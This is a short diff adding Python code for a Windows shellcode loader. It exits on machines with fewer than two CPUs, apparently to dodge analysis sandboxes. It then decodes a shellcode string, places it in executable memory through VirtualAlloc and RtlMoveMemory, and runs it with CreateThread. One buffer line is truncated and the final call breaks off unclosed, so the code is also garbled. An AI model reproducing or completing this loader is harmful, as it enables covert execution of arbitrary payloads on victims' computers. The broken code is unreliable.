@@ -1,0 +1,22 @@
+if multiprocessing.cpu_count() < 2:
+		exit()
+def injection(sc):
+	sc = sc.decode("string_escape")
+	sc = bytearray(sc)
+
+	ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+											  ctypes.c_int(len(sc)),
+											  ctypes.c_int(0x3000),
+											  ctypes.c_int(0x40))
+	ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
+									   ctypes.c_int(len(sc)))
+	buf = (ctypes.c_char * len(sc)).
+	ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+										 buf,
+										 ctypes.c_int(len(sc)))
+	ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+											 ctypes.c_int(0),
+											 ctypes.c_int(ptr),
+											 ctypes.c_int(0),
+											 ctypes.c_int(0),
+											 ctypes.pointer(ctypes.c_int(0)
